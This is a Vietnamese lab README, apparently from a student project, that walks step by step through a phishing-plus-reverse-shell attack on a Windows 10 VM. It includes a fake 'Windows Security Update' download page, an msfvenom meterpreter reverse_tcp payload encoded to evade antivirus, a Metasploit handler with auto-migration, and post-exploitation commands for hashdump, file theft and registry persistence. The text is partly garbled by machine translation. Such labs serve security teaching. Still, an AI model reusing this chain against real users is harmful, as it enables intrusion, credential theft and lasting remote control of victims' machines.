Giới thiệu

Đề tài "Tiển khai mô phỏng tấn công Social Engineering use SET Toolkit và Metasploit" xây dựng một môi trường thực thi mục tiêu:


Mô phỏng quy trình tấn công Social Engineering thực tế gồm 2 giai đoạn: Lừa đảo và Khai thác kỹ thuật (Reverse Shell) .
Đánh giá phản ứng của người dùng và hệ điều hành (Windows Defender) trước các kỹ thuật tấn công phổ biến.
Đánh giá khả năng phát hiện của các giải pháp bảo mật hiện có.
Đề xuất các biện pháp phòng vệ: MFA, đào tạo nhận thức, kiểm soát email, Đội Đỏ/Đội Xanh.



🏗️Mô hình hệ thống kiến ​​trúc kiến ​​trúc

Ubuntu Host
│
├── Kali Linux VM (Attacker)
│   └── SEToolkit + Metasploit Framework
│
├── Apache2 Web Server
│   └── Lưu trữ trang phishing (download.html) + payload (.exe)
│
└── Windows 10 x64 VM (Victim)
    └── Máy thử nghiệm – đánh giá phản ứng hệ điều hành

Thành phầnVai tròHìnhMáy chủ UbuntuMáy chủ, quản lý môi trường Virtualization & Apache2Ubuntu, CPU i5+, RAM ≥ 8GB, HDD ≥ 100GBMáy ảo Kali LinuxMáy tấn công công (Attacker)RAM 4GB, ổ cứng 40GBMáy ảo Windows 10 x64Máy nạn nhân (Victim)RAM 4GB, ổ cứng 60GBApache2Phân phối nội dung lừa đảo & tải trọngNội bộ/NAT

Nội bộ mạng (Internal/NAT):

Có thểchỉ IPHệ điều hành Ubuntu / Apache2192.168.80.135Máy ảo Kali Linux192.168.80.xxxMáy ảo Windows 10192.168.80.xxx


🔄 Quy trình tấn công (Attack Flow)

Mô hình phát triển khai theo 2 giai đoạn , phản ánh quy trình tấn công hiện đại: tấn công con người trước → khai thác kỹ thuật sau .

#mermaid-rms-r2{font-family:"Anthropic Sans",system-ui,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;font-size:16px;fill:#191919;}@keyframes edge-animation-frame{from{stroke-dashoffset:0;}}@keyframes dash{to{stroke-dashoffset:0;}}#mermaid-rms-r2 .edge-animation-slow{stroke-dasharray:9,5!important;stroke-dashoffset:900;animation:dash 50s linear infinite;stroke-linecap:round;}#mermaid-rms-r2 .edge-animation-fast{stroke-dasharray:9,5!important;stroke-dashoffset:900;animation:dash 20s linear infinite;stroke-linecap:round;}#mermaid-rms-r2 .error-icon{fill:#CC785C;}#mermaid-rms-r2 .error-text{fill:#3387a3;stroke:#3387a3;}#mermaid-rms-r2 .edge-thickness-normal{stroke-width:1px;}#mermaid-rms-r2 .edge-thickness-thick{stroke-width:3.5px;}#mermaid-rms-r2 .edge-pattern-solid{stroke-dasharray:0;}#mermaid-rms-r2 .edge-thickness-invisible{stroke-width:0;fill:none;}#mermaid-rms-r2 .edge-pattern-dashed{stroke-dasharray:3;}#mermaid-rms-r2 .edge-pattern-dotted{stroke-dasharray:2;}#mermaid-rms-r2 .marker{fill:#91918D;stroke:#91918D;}#mermaid-rms-r2 .marker.cross{stroke:#91918D;}#mermaid-rms-r2 svg{font-family:"Anthropic Sans",system-ui,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;font-size:16px;}#mermaid-rms-r2 p{margin:0;}#mermaid-rms-r2 .label{font-family:"Anthropic Sans",system-ui,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;color:#191919;}#mermaid-rms-r2 .cluster-label text{fill:#3387a3;}#mermaid-rms-r2 .cluster-label span{color:#3387a3;}#mermaid-rms-r2 .cluster-label span p{background-color:transparent;}#mermaid-rms-r2 .label text,#mermaid-rms-r2 span{fill:#191919;color:#191919;}#mermaid-rms-r2 .node rect,#mermaid-rms-r2 .node circle,#mermaid-rms-r2 .node ellipse,#mermaid-rms-r2 .node polygon,#mermaid-rms-r2 .node path{fill:#F0F0EB;stroke:#D9D8D5;stroke-width:1px;}#mermaid-rms-r2 .rough-node .label text,#mermaid-rms-r2 .node .label text,#mermaid-rms-r2 .image-shape .label,#mermaid-rms-r2 .icon-shape .label{text-anchor:middle;}#mermaid-rms-r2 .node .katex path{fill:#000;stroke:#000;stroke-width:1px;}#mermaid-rms-r2 .rough-node .label,#mermaid-rms-r2 .node .label,#mermaid-rms-r2 .image-shape .label,#mermaid-rms-r2 .icon-shape .label{text-align:center;}#mermaid-rms-r2 .node.clickable{cursor:pointer;}#mermaid-rms-r2 .root .anchor path{fill:#91918D!important;stroke-width:0;stroke:#91918D;}#mermaid-rms-r2 .arrowheadPath{fill:#0b0b0b;}#mermaid-rms-r2 .edgePath .path{stroke:#91918D;stroke-width:1px;}#mermaid-rms-r2 .flowchart-link{stroke:#91918D;fill:none;}#mermaid-rms-r2 .edgeLabel{background-color:#F5E6D8;text-align:center;}#mermaid-rms-r2 .edgeLabel p{background-color:#F5E6D8;}#mermaid-rms-r2 .edgeLabel rect{opacity:0.5;background-color:#F5E6D8;fill:#F5E6D8;}#mermaid-rms-r2 .labelBkg{background-color:rgba(245, 230, 216, 0.5);}#mermaid-rms-r2 .cluster rect{fill:#CC785C;stroke:hsl(15, 12.3364485981%, 48.0392156863%);stroke-width:1px;}#mermaid-rms-r2 .cluster text{fill:#3387a3;}#mermaid-rms-r2 .cluster span{color:#3387a3;}#mermaid-rms-r2 div.mermaidTooltip{position:absolute;text-align:center;max-width:200px;padding:2px;font-family:"Anthropic Sans",system-ui,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;font-size:12px;background:#CC785C;border:1px solid hsl(15, 12.3364485981%, 48.0392156863%);border-radius:2px;pointer-events:none;z-index:100;}#mermaid-rms-r2 .flowchartTitleText{text-anchor:middle;font-size:18px;fill:#191919;}#mermaid-rms-r2 rect.text{fill:none;stroke-width:0;}#mermaid-rms-r2 .icon-shape,#mermaid-rms-r2 .image-shape{background-color:#F5E6D8;text-align:center;}#mermaid-rms-r2 .icon-shape p,#mermaid-rms-r2 .image-shape p{background-color:#F5E6D8;padding:2px;}#mermaid-rms-r2 .icon-shape .label rect,#mermaid-rms-r2 .image-shape .label rect{opacity:0.5;background-color:#F5E6D8;fill:#F5E6D8;}#mermaid-rms-r2 .label-icon{display:inline-block;height:1em;overflow:visible;vertical-align:-0.125em;}#mermaid-rms-r2 .node .label-icon path{fill:currentColor;stroke:revert;stroke-width:revert;}#mermaid-rms-r2 .node .neo-node{stroke:#D9D8D5;}#mermaid-rms-r2 [data-look="neo"].node rect,#mermaid-rms-r2 [data-look="neo"].cluster rect,#mermaid-rms-r2 [data-look="neo"].node polygon{stroke:url(#mermaid-rms-r2-gradient);filter:drop-shadow( 1px 2px 2px rgba(185,185,185,1));}#mermaid-rms-r2 [data-look="neo"].node path{stroke:url(#mermaid-rms-r2-gradient);stroke-width:1px;}#mermaid-rms-r2 [data-look="neo"].node .outer-path{filter:drop-shadow( 1px 2px 2px rgba(185,185,185,1));}#mermaid-rms-r2 [data-look="neo"].node .neo-line path{stroke:#D9D8D5;filter:none;}#mermaid-rms-r2 [data-look="neo"].node circle{stroke:url(#mermaid-rms-r2-gradient);filter:drop-shadow( 1px 2px 2px rgba(185,185,185,1));}#mermaid-rms-r2 [data-look="neo"].node circle .state-start{fill:#000000;}#mermaid-rms-r2 [data-look="neo"].icon-shape .icon{fill:url(#mermaid-rms-r2-gradient);filter:drop-shadow( 1px 2px 2px rgba(185,185,185,1));}#mermaid-rms-r2 [data-look="neo"].icon-shape .icon-neo path{stroke:url(#mermaid-rms-r2-gradient);filter:drop-shadow( 1px 2px 2px rgba(185,185,185,1));}#mermaid-rms-r2 :root{--mermaid-font-family:"Anthropic Sans",system-ui,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;}Giai đoạn 1: SocialEngineeringTạo trang download giảmạoWindows Security UpdateNạn nhân tải filesetup_windows_update.exeGiai đoạn 2: Khai thác kỹthuậtPayload Meterpreterreverse_tcpencoded x64/xor_dynamicMetasploit multi/handlertự động AutoMigrateChiếm quyền điều khiển+ Persistence

Bước thực hiện chi tiết

Bướcnội phânPhần cuối0Cấu hình mạng, khởi động Apache2, tạo web thư mụcbất kỳ1Tạo trang lừa đảo download.html(giả mạo Windows Update)Nhà ga số 22Tạo tải trọng được mã hóa bằng msfvenom( meterpreter/reverse_tcp+ xor_dynamic)Nhà ga số 23Khởi động Listener multi/handlerwithAutoRunScript migrateNhà ga số 14Truy cập từ máy Windows, tải và chạy tệp.exeNạn nhân5Kiểm tra phiên Meterpreter, thực hiện hậu khai thác & kiên trìNhà ga số 1


🛠️ Công nghệ & Công cụ sử dụng

Công cụđiểm đếnBộ công cụ kỹ thuật xã hội (SET)Mô phỏng tấn công phi kỹ thuật (lừa đảo, thu hoạch thông tin xác thực)Metasploit FrameworkSinh payload, lắng nghe và quản lý shell đảo ngượcmsfvenomTạo tải trọng windows/x64/meterpreter/reverse_tcp(đã được chuẩn bị, mã hóa)Apache2Máy chủ web phân phối trang lừa đảo và tải trọngKali LinuxHệ điều hành tấn công (Attacker)Windows 10 x64Hệ điều hành nạn nhân (Nạn nhân)


🚀 Hướng dẫn phát triển khai

Yêu cầu môi trường


Ubuntu Host (hoặc Kali Linux) với cài đặt Apache2
Metasploit Framework
Máy ảo Windows 10 x64 (ằm trong cùng mạng nội bộ/NAT)
Quyềnsudo


Bước 0 — Cấu hình mạng (nếu Kali chưa có IP)

Cách 1 — Xin IP từ DHCP (thử trước):

đậpsudo dhclient eth0
ip a

Nếu inet 192.168.x.xxuất hiện → thành công, hãy sử dụng IP đó.

Cách 2 — Nếu DHCP không được cấp, hãy đặt IP tĩnh:

đậpsudo ip addr add 192.168.80.135/24 dev eth0
sudo ip link set eth0 up
sudo ip route add default via 192.168.80.2

# Kiểm tra lại
ip a
ping 192.168.80.1

Bước 1 — Khởi động Apache & tạo web thư mục

đập# Terminal bất kỳ
sudo systemctl start apache2
sudo systemctl enable apache2

sudo mkdir -p /var/www/html/fb
sudo chmod -R 777 /var/www/html/fb
sudo fuser -k 4567/tcp

Kiểm tra quá trình chạy Apache (phải được tìm thấy Active: active (running)):

đậpsudo systemctl status apache2

Bước 2 — Tạo trang lừa đảo (download.html)

Sử teedụng thay thế nanođể tránh lỗi trong một số trường môi trường:

đập# Terminal 2
sudo tee /var/www/html/fb/download.html << 'EOF'
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="utf-8">
    <title>Windows Security Update</title>
    <style>
        body{font-family:Arial;background:#0f0f0f;color:white;text-align:center;padding:50px}
        .box{max-width:600px;margin:auto;background:#1f1f1f;padding:40px;border-radius:12px;box-shadow:0 0 15px #0078d4}
        button{padding:18px 50px;font-size:20px;background:#0078d4;color:white;border:none;border-radius:8px;cursor:pointer}
        button:hover{background:#106ebe}
    </style>
</head>
<body>
    <div class="box">
        <h1>Windows Update</h1>
        <p><strong>Cap nhat bao mat khan cap</strong></p>
        <p>He thong phat hien lo hong bao mat. Vui long tai va cai dat ngay.</p>
        <a href="setup_windows_update.exe" download>
            <button>TAI VA CAI DAT NGAY</button>
        </a>
        <p style="margin-top:25px;color:#aaa">File: setup_windows_update.exe</p>
    </div>
</body>
</html>
EOF

Kiểm tra tệp đã tạo:

đậpls -lh /var/www/html/fb/

Bước 3 — Tạo payload với msfvenom (được mã hóa)


👉 So sánh cách làm cũ:



Payload cũ (bị AV detect)Payload mới (định nghĩa hơn)Tên tải trọngmeterpreter_reverse_tcpmeterpreter/reverse_tcpLoạiKhông có sân khấu (~7MB)Staged (nhỏ hơn)Mã hóaKhông mã hóaMã hóa 5 lần ( x64/xor_dynamic)năng lượng bị AV phát hiệnCaogiao hàng


⚠️ Thay đổi 192.168.80.135việc thực thi IP của Kali (kiểm tra bằng ip a).



đập# Terminal 2 — chú ý dấu "/" thay vì "_" trong tên payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.80.135 LPORT=4567 \
  -e x64/xor_dynamic -i 5 \
  -f exe \
  --platform windows \
  -a x64 \
  -o ~/setup_windows_update.exe

Sao chép tải trọng vào web thư mục:

đậpsudo cp ~/setup_windows_update.exe /var/www/html/fb/setup_windows_update.exe
sudo chmod 777 /var/www/html/fb/setup_windows_update.exe
ls -lh /var/www/html/fb/


✅ Tệp .exephải có khoảng kích thước 200–400KB . Nếu thấy ~7MB đang sử dụng cũ tải trọng (cấu hình sai).



Bước 4 — Khởi động Listener (Metasploit) với AutoMigrate


⚠️ Terminal 1 phải luôn mở trong suốt quá trình demo. Không đóng hoặc nhấn Ctrl+C.



đập# Terminal 1
msfconsole -q

Trong msfconsole, gõ từng dòng:

use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.80.135
set LPORT 4567
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
exploit -j

Phải thấy dòng:

[*] Started reverse TCP handler on 192.168.80.135:4567

Giải thích:


AutoRunScript migrate: tự động di chuyển tải trọng sang tiến trình khác ( explorer.exe) ngay khi có phiên → tải trọng không bị hủy khi nạn nhân đóng tệp .exe.
ExitOnSession false: handler tiếp tục lắng nghe ngay cả khi đã có session, phục vụ cho nhiều kết nối.


Bước 5 — Thử nghiệm trên máy Windows (Victim)


⚠️ Bắt buộc tắt Windows Defender trước khi chạy file. Đây là yêu cầu của lab môi trường.




Mở trình duyệt → truy cậphttp://192.168.80.135/fb/download.html
Tải tập tinsetup_windows_update.exe
Vào Windows Security → Bảo vệ khỏi virus và mối đe dọa → Quản lý cài đặt
Bảo vệ thời gian thực
Bảo vệ được cung cấp qua đám mây
Gửi mẫu tự động
Tắt Tamper Protection (quan trọng)
Chuột phải vào file → Chạy với tư cách quản trị viên



ℹ️ Sau khi chạy file, có thể thấy cửa sổ cmd flash nhanh rồi biến mất — đây là dấu hiệu bình thường , payload đang di chuyển sang tiến trình khác.



Bước 6 — Kiểm tra phiên

# Trong msfconsole
sessions

Kết quả mong đợi:

Nhận dạngTênKiểuThông tinSự liên quan1meterpreter x64/windowsDESKTOP-XXX\user192.168.80.135 → 192.168.80.X

Vào buổi tập và thao tác:

sessions -i 1

đập# Các lệnh demo cơ bản trong meterpreter
sysinfo
getuid
getpid
ps
pwd
ls


🧩 Hậu khai thác (Sau khai thác)

Lệnhnăng lượngsysinfoXem nhân hệ thống thông tingetuid/getpidXem quyền người dùng & hiện tại PIDpsList List đang chạyscreenshotChụp màn hình máy nhândownload/uploadTải file qua lại giữa 2 máyhashdumpTrích xuất hàm băm mật khẩu (hash)search -f <tên_file>Tìm file trên máy nhân

Ví dụ tìm và đọc file:

đậpsearch -f 123.txt
ls C:\\Users\\Administrator\\Desktop
cat C:\\Users\\Administrator\\Desktop\\123.txt

Persistence — Duy trì kết nối sau khi khởi động lại


Persistence giúp duy trì kết nối sau khi nạn nhân khởi động lại — thường được đề cập trong phần tấn công phân tích của báo cáo.



Cách 1 — Module persistence_exe(chạy trong phiên Meterpreter):

run post/windows/manage/persistence_exe STARTUP=REGISTRY SESSION=1

Cách 2 — Mô-đun persistence(phiên nền trước):

background
use post/multi/manage/shell_to_meterpreter
use exploit/windows/local/persistence
set SESSION 1
set STARTUP REGISTRY
run
